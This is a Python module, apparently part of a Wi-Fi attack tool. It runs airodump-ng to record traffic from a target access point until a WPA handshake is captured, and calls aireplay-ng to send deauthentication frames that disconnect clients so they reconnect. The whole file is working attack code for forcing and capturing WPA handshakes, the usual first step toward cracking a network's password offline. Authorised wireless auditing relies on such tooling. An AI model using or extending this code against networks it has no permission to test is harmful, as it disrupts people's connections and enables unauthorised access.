import logging
import time
import subprocess
import os
import signal
from pathlib import Path
import re
from typing import Tuple, Optional

from utils import logger, run_cmd  

ANSI_RE = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')

def strip_ansi(s: str) -> str:
    return ANSI_RE.sub('', s).replace('\r', '').strip()

def start_airodump_and_watch(iface: str, channel: int, bssid_ap: str, out_prefix: Path,
                             timeout: float = 6120.0) -> Tuple[Optional[subprocess.Popen], Optional[Path]]:
    cmd = [
        "airodump-ng",
        "--output-format", "cap",
        "-c", str(channel),
        "-w", str(out_prefix),   
        "-d", bssid_ap,
        iface
    ]

    logger.info("Starting airodump-ng: %s", " ".join(cmd))
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            start_new_session=True
        )
    except FileNotFoundError:
        logger.error("airodump-ng not found")
        return None, None
    except Exception as e:
        logger.exception("Failed to start airodump-ng: %s", e)
        return None, None

    start = time.time()
    cap_path: Optional[Path] = None

    try:
        while True:
            if timeout and (time.time() - start) > timeout:
                logger.info("Timeout reached without finding handshake")
                break

            if proc.poll() is not None:
                remaining = proc.stdout.read() if proc.stdout else ""
                if remaining:
                    logger.debug("Remaining output after exit: %s", remaining)
                break

            line = proc.stdout.readline()
            if not line:
                time.sleep(0.05)
                if cap_path is None:
                    matches = list(out_prefix.parent.glob(f"{out_prefix.name}-*.cap"))
                    if matches:
                        cap_path = Path(matches[0])
                        logger.info("Found CAP file: %s", cap_path)
                continue

            clean = strip_ansi(line)
            logger.debug("airodump: %s", clean)

            if cap_path is None:
                matches = list(out_prefix.parent.glob(f"{out_prefix.name}-*.cap"))
                if matches:
                    cap_path = Path(matches[0])
                    logger.info("Found CAP file: %s", cap_path)

            if "WPA handshake" in clean or "WPA Handshake" in clean or "WPA handshake:" in clean:
                logger.info("Detected handshake in stdout: %s", clean)
                return proc, cap_path

        return proc, cap_path
    except KeyboardInterrupt:
        logger.info("Interrupted by user, terminating airodump-ng")
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except Exception:
            proc.terminate()
        return proc, cap_path
    except Exception:
        logger.exception("Unexpected error while reading airodump stdout")
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except Exception:
            proc.terminate()
        return proc, cap_path


def check_handshake(cap_path: Optional[Path]) -> bool:
    if cap_path is None:
        logger.debug("check_handshake: cap_path is None")
        return False

    try:
        if cap_path.exists() and cap_path.is_file() and cap_path.stat().st_size > 0:
            logger.info("CAP exists and is non-empty: %s", cap_path)
            return True
        else:
            logger.info("CAP missing or empty: %s", cap_path)
            return False
    except Exception as e:
        logger.error("Error checking cap file %s: %s", cap_path, e)
        return False


def deauthenthicate(bssid_ap: str, bssid_c: Optional[str], iface: str, count: int = 1) -> Tuple[int, str, str]:
    if count is None:
        count = 0
    
    cmd_deauth = ["aireplay-ng", "--deauth", str(count), "-a", bssid_ap]
    if bssid_c:
        cmd_deauth += ["-c", bssid_c]
    cmd_deauth.append(iface)
    print(cmd_deauth)
    rc, stdout, stderr = run_cmd(cmd_deauth, timeout=10 + (int(count) if int(count) > 0 else 0))
    if rc != 0:
        logger.error("Failed to send deauthentication command: %s", stderr)
    else:
        logger.debug("Deauth sent: %s", cmd_deauth)
    return rc, stdout, stderr
